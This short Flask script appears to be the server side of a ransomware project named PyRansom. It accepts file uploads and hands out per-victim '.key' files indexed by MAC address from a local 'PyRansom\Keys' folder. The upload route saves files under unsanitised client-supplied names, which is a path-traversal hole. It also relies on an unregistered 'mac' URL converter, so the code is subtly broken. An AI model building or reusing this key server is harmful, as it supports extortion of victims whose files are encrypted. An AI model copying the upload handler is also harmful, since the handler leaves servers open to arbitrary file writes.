# %%
#imports
import os
from flask import Flask, request, send_from_directory

# %%
app = Flask(__name__)
upload_file = os.path.abspath('uploader.py')

# %%
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save(file.filename)
    return "File handled successfully."

@app.route('/keys/<mac:mac>', methods=['GET'])
def keys(mac):
    return send_from_directory('C:\\Users\\krist\\OneDrive\\Legion\\Scripts\\PyRansom\\Keys', mac + '.key')

# %%
os.chdir('C:\\Users\\krist\\OneDrive\\Legion\\Scripts\\PyRansom\\Keys')

# %%
app.run()


